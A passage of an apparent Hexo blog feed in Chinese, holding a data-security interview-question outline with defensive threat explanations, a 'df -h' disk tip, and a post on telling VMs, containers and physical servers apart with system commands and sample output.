规定的合法性条件，如基于充分性认定（接收国的数据保护水平被欧盟认定为充分）、使用标准合同条款（SCCs）或基于约束性公司规则（BCRs）等方式。</li><li><strong>跨境传输安全保障措施</strong>：在跨境传输过程中，采取适当的安全保障措施，如对传输的数据进行加密、确保传输服务提供商遵守数据保护要求等。同时，要对跨境传输的数据进行跟踪和记录，包括传输的目的、接收方的信息、传输的数据内容和数量等，以确保数据在跨境过程中的安全性和合规性。</li></ul></li></ol></li><li><strong>合规审计与应对</strong>：询问关于合规审计的经验和应对措施，例如，“如果企业面临数据安全合规审计，你认为需要重点准备哪些方面的内容？如果发现不符合法规的情况，应该如何处理？”</li></ul></li></ul></li><li><p>数据安全工具与平台</p><ul><li>工具使用经验<ul><li><strong>数据安全工具列举</strong>：要求候选人列举并简单介绍一些常用的数据安全工具，如数据加密工具（如 VeraCrypt）、数据脱敏工具（如 ARX Data Anonymization Tool）、访问控制工具（如 Okta Identity Cloud）等。</li><li><strong>工具的实际操作</strong>：考查候选人对特定工具的实际操作能力，例如，“请描述一下你使用过的一款数据加密工具的加密流程，以及在操作过程中遇到的问题和解决方法。”</li></ul></li><li>平台集成与管理<ul><li><strong>安全工具集成</strong>：询问候选人如何将不同的数据安全工具集成到企业的 IT 系统中，如 “在企业现有信息系统中集成数据访问控制工具时，需要考虑哪些技术和管理方面的问题？”</li><li><strong>平台安全管理</strong>：了解候选人对数据安全平台的管理经验，例如，“在管理数据安全监控平台时，如何设置有效的安全策略和告警机制？”</li></ul></li></ul></li><li><p>数据安全威胁与应对策略</p><ul><li><p>威胁识别能力</p><ul><li><p><strong>常见威胁类型</strong>：考查候选人对常见数据安全威胁（如数据泄露、数据篡改、恶意软件攻击等）的识别能力，例如，“请列举一些可能导致企业数据泄露的常见方式，并说明如何预防。”</p></li><li><p><strong>网络攻击导致的数据泄露</strong></p><ul><li><p>恶意软件入侵</p><ul><li><strong>常见方式</strong>：攻击者通过钓鱼邮件、恶意软件下载链接或受感染的外部设备等途径，将病毒、木马、勒索软件等恶意程序植入企业的计算机系统。这些恶意软件一旦运行，就可以窃取敏感数据，如用户登录凭证、企业财务数据等。例如，员工不小心点击了一封看似来自公司领导的钓鱼邮件中的附件，附件中的恶意软件就会在后台悄悄运行，收集并发送数据。</li><li><strong>预防措施</strong>：安装可靠的反病毒软件和反恶意软件工具，并定期更新病毒库。对员工进行安全意识培训，教育他们如何识别钓鱼邮件，避免点击可疑的链接和下载不明来源的文件。同时，限制员工对外部设备（如 U 盘）的使用，如有必要，对外部设备进行安全扫描后再允许接入公司网络。</li></ul></li><li><p>黑客攻击（如 SQL 注入、DDoS 攻击）</p><ul><li><p>常见方式</p><p>：</p><ul><li><strong>SQL 注入</strong>：攻击者通过在输入框（如网站登录界面、搜索框）中输入恶意的 SQL 语句，利用 Web 应用程序对用户输入验证的漏洞，获取数据库中的敏感信息。例如，攻击者在一个电商网站的搜索框中输入特殊的 SQL 语句，绕过网站的权限验证，从而获取用户订单信息、信用卡号码等。</li><li><strong>DDoS 攻击（分布式拒绝服务攻击）</strong>：攻击者利用大量的僵尸主机向目标服务器发送海量请求，使服务器资源耗尽，无法正常提供服务。在攻击过程中，攻击者可能会趁机窃取数据或者通过其他方式获取服务器的访问权限，进而获取数据。</li></ul></li><li><p>预防措施</p><p>：</p><ul><li><strong>对于 SQL 注入</strong>：开发人员在编写代码时，要对用户输入进行严格的验证和过滤，使用参数化查询来防止 SQL 注入攻击。定期对 Web 应用程序进行安全漏洞扫描，如使用专业的漏洞扫描工具（如 Acunetix、Netsparker 等）来检测和修复可能存在的 SQL 注入漏洞。</li><li><strong>对于 DDoS 攻击</strong>：企业可以采用 DDoS 防护服务，这些服务提供商通常具有强大的网络流量清洗能力，能够识别并过滤掉恶意流量。同时，企业自身的网络架构设计应具备一定的弹性和冗余，如采用负载均衡技术，以便在遭受攻击时能够分散流量，减轻服务器的压力。</li></ul></li></ul></li></ul></li><li><p><strong>内部人员失误或违规导致的数据泄露</strong></p><ul><li>员工疏忽<ul><li><strong>常见方式</strong>：员工可能会因为粗心大意而将敏感数据发送给错误的人，或者在不安全的环境中（如公共无线网络）处理公司数据。例如，员工在使用个人邮箱发送工作文件时，不小心将包含客户敏感信息的文件发送给了外部无关人员；或者在咖啡店使用公司笔记本电脑处理数据，由于无线网络未加密，数据被附近的攻击者窃取。</li><li><strong>预防措施</strong>：加强员工数据安全培训，强调数据保护的重要性，规范员工的数据处理行为。例如，要求员工只能使用公司指定的安全通信工具发送敏感数据，并且在发送前仔细核对收件人信息。对于在外部环境下处理公司数据，提供虚拟专用网络（VPN）等安全工具，确保数据传输的保密性。</li></ul></li><li>内部人员恶意行为<ul><li><strong>常见方式</strong>：企业内部某些员工可能出于经济利益、报复心理等原因，主动窃取或泄露公司数据。例如，一个即将离职的员工，为了获取经济利益，将公司的核心技术资料卖给竞争对手；或者一个对公司不满的员工，将客户数据发布到互联网上进行报复。</li><li><strong>预防措施</strong>：实施严格的访问控制策略，如基于角色的访问控制（RBAC）或基于属性的访问控制（ABAC），确保员工只能访问其工作所需的最少数据量。对员工的行为进行监控和审计，特别是对敏感数据的访问和操作行为。建立完善的内部举报机制，鼓励员工举报可疑的内部数据泄露行为。</li></ul></li></ul></li><li><p><strong>第三方合作伙伴风险导致的数据泄露</strong></p><ul><li>合作伙伴安全漏洞<ul><li><strong>常见方式</strong>：企业与第三方供应商（如云计算服务提供商、软件外包商、数据存储服务商等）合作时，如果这些合作伙伴的系统出现安全漏洞，企业存储在合作伙伴处的数据也可能面临泄露风险。例如，企业将数据存储在某云服务提供商的服务器上，该云服务提供商的服务器被黑客攻击，导致企业的数据泄露。</li><li><strong>预防措施</strong>：在选择合作伙伴时，要对其进行严格的安全评估，包括查看其安全认证、数据保护措施、安全事件响应能力等。在合作协议中明确数据安全责任和义务，要求合作伙伴遵守与企业相同或更高的数据安全标准。定期对合作伙伴进行安全审计，确保其持续符合安全要求。</li></ul></li></ul></li><li><p><strong>物理安全漏洞导致的数据泄露</strong></p><ul><li>设备丢失或被盗<ul><li><strong>常见方式</strong>：企业的笔记本电脑、移动硬盘、U 盘等存储设备如果丢失或被盗，其中存储的敏感数据就可能被泄露。例如，员工在出差过程中丢失了装有客户数据的笔记本电脑，若电脑没有进行加密，数据就很容易被获取。</li><li><strong>预防措施</strong>：对所有存储敏感数据的移动设备进行加密，如使用 BitLocker（Windows）或 FileVault（Mac）等加密工具。同时，建立设备丢失或被盗后的应急响应机制，如远程擦除设备数据的功能。</li></ul></li><li>数据中心物理入侵<ul><li><strong>常见方式</strong>：攻击者通过非法进入企业的数据中心，直接获取服务器、存储设备等硬件中的数据。例如，攻击者绕过安保系统，进入数据中心，从服务器硬盘中窃取未加密的数据。</li><li><strong>预防措施</strong>：加强数据中心的物理安全措施，如安装监控摄像头、门禁系统、报警系统等。对进入数据中心的人员进行严格的身份验证和授权，限制无关人员的进入。同时，对数据中心内的数据存储设备进行加密，增加物理获取数据的难度。</li></ul></li></ul></li><li><p><strong>新型威胁感知</strong>：关注候选人对新型数据安全威胁（如人工智能模型带来的数据隐私风险、物联网设备的数据安全隐患）的认知，例如，“随着人工智能的发展，你认为在数据安全方面会面临哪些新的挑战？”</p></li></ul></li><li><p>应急响应策略</p><ul><li><strong>响应流程规划</strong>：询问候选人如何规划数据安全事件的应急响应流程，例如，“请描述一个完整的数据安全事件应急响应计划，包括事件发现、评估、遏制、根除和恢复等环节。”</li><li><strong>案例分析与经验分享</strong>：可以让候选人分享之前处理数据安全事件的案例，例如，“请分享一次你参与的数据泄露事件应急处理过程，包括采取的措施、遇到的困难和最终的结果。”</li></ul></li></ul></li><li><p>项目经验与实践能力</p><ul><li>数据安全项目参与<ul><li><strong>项目角色与职责</strong>：了解候选人在数据安全项目中的角色和职责，例如，“请描述一下你在最近的数据加密项目中承担的主要工作内容。”</li><li><strong>项目成果与挑战</strong>：询问项目的成果和遇到的挑战，例如，“在之前的数据访问控制项目中，你取得了哪些成果？遇到了哪些困难，是如何解决的？”</li></ul></li><li>实际问题解决能力<ul><li><strong>场景化问题解决</strong>：提供一些数据安全场景问题，考查候选人的实际解决问题的能力，例如，“如果发现企业内部网络中的一台服务器上的数据被异常访问，你会采取哪些措施来调查和解决这个问题？”</li></ul></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>datasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>view_dir_belong_disk</title>
    <link href="/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/"/>
    <url>/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="查看目录归属磁盘"><a href="#查看目录归属磁盘" class="headerlink" title="查看目录归属磁盘"></a>查看目录归属磁盘</h2><p>df -h [目录]</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">ubuntu<span class="hljs-variable">@ip</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>:<span class="hljs-regexp">/$ df -h /opt</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="hljs-regexp">/dev</span><span class="hljs-regexp">/root       6.8G  2.6G  4.2G  38% /</span><br></code></pre></td></tr></table></figure><p><img src="/2024/12/16/yunwei/yunweitips/view_dir_belong_disk/image-20241217142507343.png" alt="image-20241217142507343"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>distinguish_virtual_container_machine</title>
    <link href="/2024/12/16/security/cloudsec/cloudsectips/distinguish_virtual_container_machine/"/>
    <url>/2024/12/16/security/cloudsec/cloudsectips/distinguish_virtual_container_machine/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>区分虚拟机、容器和物理机的方法</p><h1 id="判断是否为虚拟机"><a href="#判断是否为虚拟机" class="headerlink" title="判断是否为虚拟机"></a>判断是否为虚拟机</h1><h2 id="Linux服务器"><a href="#Linux服务器" class="headerlink" title="Linux服务器"></a>Linux服务器</h2><h3 id="hostnamectl-grep-Virtualization"><a href="#hostnamectl-grep-Virtualization" class="headerlink" title="hostnamectl | grep Virtualization"></a>hostnamectl | grep Virtualization</h3><p><strong>非虚拟机，查询没有结果</strong></p><p><strong>虚拟机，查询有结果</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/var/log</span><span class="hljs-comment"># hostnamectl | grep Virtualization</span><br>  <span class="hljs-symbol">Virtualization:</span> kvm<br></code></pre></td></tr></table></figure><h3 id="dmidecode-s-system-product-name"><a href="#dmidecode-s-system-product-name" class="headerlink" title="dmidecode -s system-product-name"></a>dmidecode -s system-product-name</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@110</span> ~]<span class="hljs-meta"># dmidecode -s system-product-name</span><br>Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><p><strong>非虚拟机，查询结果为具体产品型号</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@1_1_1_1</span> /]<span class="hljs-meta"># dmidecode -s system-product-name</span><br>PowerEdge R630<br></code></pre></td></tr></table></figure><p><strong>虚拟机，查询结果是KVM或者云厂商设备型号</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">[root@ /]# dmidecode -s <span class="hljs-keyword">system</span>-product-name<br>KVM<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">(<span class="hljs-keyword">base) </span>[root@ ~]<span class="hljs-comment"># dmidecode -s system-product-name</span><br>Alibaba <span class="hljs-keyword">Cloud </span>ECS<br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">[root@ ~]# dmidecode -s system-product-<span class="hljs-keyword">name</span><br>VMware <span class="hljs-keyword">Virtual</span> <span class="hljs-keyword">Platform</span><br></code></pre></td></tr></table></figure><h3 id="dmesg-grep-i-virtual"><a href="#dmesg-grep-i-virtual" class="headerlink" title="dmesg | grep -i virtual"></a>dmesg | grep -i virtual</h3><p><strong>非虚拟机，查询没有记录</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">(<span class="hljs-keyword">base</span>) [root@ /]<span class="hljs-meta"># dmesg | grep -i virtual</span><br>(<span class="hljs-keyword">base</span>) [root@ /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><strong>虚拟机，查询有记录</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@ /]</span># <span class="hljs-selector-tag">dmesg</span> | <span class="hljs-selector-tag">grep</span> <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">virtual</span><br><span class="hljs-selector-attr">[    0.000000]</span> <span class="hljs-selector-tag">Booting</span> <span class="hljs-selector-tag">paravirtualized</span> <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">KVM</span><br><span class="hljs-selector-attr">[    0.513181]</span> <span class="hljs-selector-tag">input</span>: <span class="hljs-selector-tag">VirtualPS</span>/<span class="hljs-number">2</span> <span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">VMMouse</span> <span class="hljs-selector-tag">as</span> /<span class="hljs-selector-tag">devices</span>/<span class="hljs-selector-tag">platform</span>/<span class="hljs-selector-tag">i8042</span>/<span class="hljs-selector-tag">serio1</span>/<span class="hljs-selector-tag">input</span>/<span class="hljs-selector-tag">input2</span><br><span class="hljs-selector-attr">[    0.513391]</span> <span class="hljs-selector-tag">input</span>: <span class="hljs-selector-tag">VirtualPS</span>/<span class="hljs-number">2</span> <span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">VMMouse</span> <span class="hljs-selector-tag">as</span> /<span class="hljs-selector-tag">devices</span>/<span class="hljs-selector-tag">platform</span>/<span class="hljs-selector-tag">i8042</span>/<span class="hljs-selector-tag">serio1</span>/<span class="hljs-selector-tag">input</span>/<span class="hljs-selector-tag">input3</span><br><span class="hljs-selector-attr">[    0.528883]</span> <span class="hljs-selector-tag">systemd</span><span class="hljs-selector-attr">[1]</span>: <span class="hljs-selector-tag">Detected</span> <span class="hljs-selector-tag">virtualization</span> <span class="hljs-selector-tag">kvm</span>.<br><span class="hljs-selector-attr">[    0.563314]</span> <span class="hljs-selector-tag">systemd</span><span class="hljs-selector-attr">[1]</span>: <span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Setup</span> <span class="hljs-selector-tag">Virtual</span> <span class="hljs-selector-tag">Console</span>...<br><span class="hljs-selector-attr">[    2.693251]</span> <span class="hljs-selector-tag">bochs-drm</span> <span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02.0</span>: <span class="hljs-selector-tag">Virtual-1</span>: <span class="hljs-selector-tag">EDID</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">invalid</span>:<br></code></pre></td></tr></table></figure><p><strong>备注</strong>：云服务器，有可能也没有记录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@ ~]<span class="hljs-comment"># dmesg | grep -i virtual</span><br>You have mail <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root<br></code></pre></td></tr></table></figure><h3 id="lshw-class-system"><a href="#lshw-class-system" class="headerlink" title="lshw -class system"></a>lshw -class system</h3><p>lshw工具需要安装</p><p>查看硬件信息工具</p><p>安装：yum install lshw -y&#x2F;apt install lash</p><hr><p><strong>非虚拟机，结果中关注product，会有硬件厂商信息</strong></p><p>product: PowerEdge R630</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@ <span class="hljs-operator">/</span>]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-params">description:</span> Rack Mount Chassis<br>    <span class="hljs-params">product:</span> PowerEdge R630 (SKU<span class="hljs-operator">=</span>NotProvided;<span class="hljs-attr">ModelName</span><span class="hljs-operator">=</span>PowerEdge R630)<br>    <span class="hljs-params">vendor:</span> Dell Inc.<br>    <span class="hljs-params">serial:</span> GT550S2<br>    <span class="hljs-params">width:</span> <span class="hljs-number">64</span> bits<br>    <span class="hljs-params">capabilities:</span> smbios-<span class="hljs-number">2.8</span> dmi-<span class="hljs-number">2.8</span> smp vsyscall32<br>    <span class="hljs-params">configuration:</span> boot<span class="hljs-operator">=</span>normal chassis<span class="hljs-operator">=</span>rackmount sku<span class="hljs-operator">=</span>SKU<span class="hljs-operator">=</span>NotProvided;<span class="hljs-attr">ModelName</span><span class="hljs-operator">=</span>PowerEdge R630 uuid<span class="hljs-operator">=</span><span class="hljs-number">111</span>1-<span class="hljs-number">111</span>1-<span class="hljs-number">11</span>1-<span class="hljs-number">111</span>1-<span class="hljs-number">11111</span><br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">00</span><br>       <span class="hljs-params">product:</span> PnP device PNP0b00<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">8</span>a<br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>rtc_cmos<br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">01</span><br>       <span class="hljs-params">product:</span> PnP device PNP0c02<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">8</span>b<br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>system<br></code></pre></td></tr></table></figure><p><strong>虚拟机，结果中关注product，会有虚拟化信息</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@</span> <span class="hljs-string">/</span>]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-attr">description:</span> <span class="hljs-string">Computer</span><br>    <span class="hljs-attr">product:</span> <span class="hljs-string">KVM</span><br>    <span class="hljs-attr">vendor:</span> <span class="hljs-string">Red</span> <span class="hljs-string">Hat</span><br>    <span class="hljs-attr">version:</span> <span class="hljs-string">RHEL</span> <span class="hljs-number">7.6</span><span class="hljs-number">.0</span> <span class="hljs-string">PC</span> <span class="hljs-string">(i440FX</span> <span class="hljs-string">+</span> <span class="hljs-string">PIIX,</span> <span class="hljs-number">1996</span><span class="hljs-string">)</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">64</span> <span class="hljs-string">bits</span><br>    <span class="hljs-attr">capabilities:</span> <span class="hljs-string">smbios-2.8</span> <span class="hljs-string">dmi-2.8</span> <span class="hljs-string">smp</span> <span class="hljs-string">vsyscall32</span><br>    <span class="hljs-attr">configuration:</span> <span class="hljs-string">boot=normal</span> <span class="hljs-string">family=Red</span> <span class="hljs-string">Hat</span> <span class="hljs-string">Enterprise</span> <span class="hljs-string">Linux</span> <span class="hljs-string">uuid=</span><br>  <span class="hljs-string">*-pnp00:04</span><br>       <span class="hljs-attr">product:</span> <span class="hljs-string">PnP</span> <span class="hljs-string">device</span> <span class="hljs-string">PNP0b00</span><br>       <span class="hljs-attr">physical id:</span> <span class="hljs-number">5</span><br>       <span class="hljs-attr">capabilities:</span> <span class="hljs-string">pnp</span><br>       <span class="hljs-attr">configuration:</span> <span class="hljs-string">driver=rtc_cmos</span><br></code></pre></td></tr></table></figure><p>阿里云</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@ ~]<span class="hljs-comment"># lshw -class system</span><br><br>    <span class="hljs-params">description:</span> Computer<br>    <span class="hljs-params">product:</span> Alibaba Cloud ECS<br>    <span class="hljs-params">vendor:</span> Alibaba Cloud<br>    <span class="hljs-params">version:</span> pc-i440fx-<span class="hljs-number">2.1</span><br>    <span class="hljs-params">serial:</span> <span class="hljs-number">3</span>d6a05bd-<span class="hljs-number">014</span>a-<span class="hljs-number">479</span>6-<span class="hljs-number">974</span>e-<br>    <span class="hljs-params">width:</span> <span class="hljs-number">64</span> bits<br>    <span class="hljs-params">capabilities:</span> smbios-<span class="hljs-number">2.8</span> dmi-<span class="hljs-number">2.8</span> vsyscall32<br>    <span class="hljs-params">configuration:</span> boot<span class="hljs-operator">=</span>normal uuid<span class="hljs-operator">=</span><br>  <span class="hljs-operator">*</span><span class="hljs-operator">-</span>pnp00:<span class="hljs-number">00</span><br>       <span class="hljs-params">product:</span> PnP device PNP0b00<br>       physical <span class="hljs-params">id:</span> <span class="hljs-number">1</span><br>       <span class="hljs-params">capabilities:</span> pnp<br>       <span class="hljs-params">configuration:</span> driver<span class="hljs-operator">=</span>rtc_cmos<br></code></pre></td></tr></table></figure><h2 id="Windows服务器"><a href="#Windows服务器" class="headerlink" title="Windows服务器"></a>Windows服务器</h2><p>CMD命令</p><h3 id="systeminfo-findstr-i-“System-Model”"><a href="#systeminfo-findstr-i-“System-Model”" class="headerlink" title="systeminfo | findstr &#x2F;i “System Model”"></a>systeminfo | findstr &#x2F;i “System Model”</h3><h3 id="systeminfo-findstr-i-“系统型号”"><a href="#systeminfo-findstr-i-“系统型号”" class="headerlink" title="systeminfo | findstr &#x2F;i “系统型号”"></a>systeminfo | findstr &#x2F;i “系统型号”</h3><p><strong>非虚拟机，关注结果中是否存在硬件厂商信息</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Users&gt;<span class="hljs-params">system</span>info | findstr /i <span class="hljs-string">&quot;系统型号&quot;</span><br>系统型号:         IBM <span class="hljs-params">System</span>X X3550 M3 -[<span class="hljs-number">7944</span>ONT]-<br></code></pre></td></tr></table></figure><p><strong>虚拟机，关注结果中是否存在虚拟化信息</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Users\<span class="hljs-literal">admin</span>&gt;<span class="hljs-params">system</span>info | findstr /i <span class="hljs-string">&quot;系统型号&quot;</span><br>系统型号:         VMware Virtual Platform<br></code></pre></td></tr></table></figure><p>POWERSHELL命令</p><h3 id="get-wmiobject-win32-computersystem-fl-model"><a href="#get-wmiobject-win32-computersystem-fl-model" class="headerlink" title="get-wmiobject win32_computersystem | fl model"></a><strong>get-wmiobject win32_computersystem | fl model</strong></h3><p><strong>非虚拟机，关注结果中是否存在硬件厂商信息</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">PS</span> <span class="hljs-string">C</span>:\<span class="hljs-string">Users</span>&gt; <span class="hljs-built_in">get-wmiobject</span> <span class="hljs-string">win32_computersystem</span> | <span class="hljs-string">fl</span> <span class="hljs-string">model</span>  <span class="hljs-string">model</span> : <span class="hljs-string">IBM</span> <span class="hljs-string">SystemX</span> <span class="hljs-string">X3550</span> <span class="hljs-string">M3</span> -[<span class="hljs-string">7944ONT</span>]-<br></code></pre></td></tr></table></figure><p><strong>虚拟机，关注结果中是否存在虚拟化信息</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">PS</span> <span class="hljs-string">C</span>:\<span class="hljs-string">Users</span>\<span class="hljs-string">admin</span>&gt; <span class="hljs-built_in">get-wmiobject</span> <span class="hljs-string">win32_computersystem</span> | <span class="hljs-string">fl</span> <span class="hljs-string">model</span>  <span class="hljs-string">model</span> : <span class="hljs-string">VMware</span> <span class="hljs-string">Virtual</span> <span class="hljs-string">Platform</span>  <br></code></pre></td></tr></table></figure><h1 id="判断是否为容器"><a href="#判断是否为容器" class="headerlink" title="判断是否为容器"></a>判断是否为容器</h1><h3 id="查看-proc-1-cgroup"><a href="#查看-proc-1-cgroup" class="headerlink" title="查看 &#x2F;proc&#x2F;1&#x2F;cgroup"></a>查看 &#x2F;proc&#x2F;1&#x2F;cgroup</h3><p>原理：容器通过 cgroup 实现资源限制，查看是否在一个 cgroup 组中</p><p><strong>物理机或虚拟机</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@subdomain</span>-src /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">13</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">12</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">11</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">10</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">9</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">8</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">7</span><span class="hljs-symbol">:net_cls</span>,<span class="hljs-symbol">net_prio:</span>/<br><span class="hljs-number">6</span><span class="hljs-symbol">:misc</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/init</span>.scope<br><span class="hljs-number">4</span><span class="hljs-symbol">:rdma</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">3</span><span class="hljs-symbol">:cpu</span>,<span class="hljs-symbol">cpuacct:</span>/init.scope<br><span class="hljs-number">2</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/init</span>.scope<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@localhost</span> /]<span class="hljs-comment"># cat /proc/1/cgroup</span><br><span class="hljs-number">11</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">10</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">9</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">8</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">7</span><span class="hljs-symbol">:cpuacct</span>,<span class="hljs-symbol">cpu:</span>/<br><span class="hljs-number">6</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:net_prio</span>,<span 